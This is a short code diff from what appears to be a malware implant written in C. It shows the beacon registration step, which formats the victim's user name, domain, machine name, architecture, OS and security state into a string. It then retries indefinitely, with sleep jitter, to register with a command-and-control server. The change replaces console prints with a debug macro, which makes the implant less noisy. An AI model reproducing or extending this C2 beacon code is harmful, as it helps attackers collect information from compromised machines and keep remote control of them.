@@ -66,14 +66,12 @@ void main()
     // format the data correctly so it can be used when we call back to the c2
     sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName,
                                                                                    CompInfo.Arch, CompInfo.OS, CompInfo.Secure);
-    
-    // try register back with the C2
-    printf("%s, %d\n", UriBuffer, dwSize);
 
+    // register back with the c2
     while (!BeaconRegisterC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, (LPCWSTR)UriBuffer, dwSize))
     {
         // not much we can do really if we cant hit the c2, guess we just wait an retry.
-        printf("Failed to connect\n");
+        DEBUG("Failed to connect\n");
         Sleep(_CALLBACK_JITTER);
     }
 
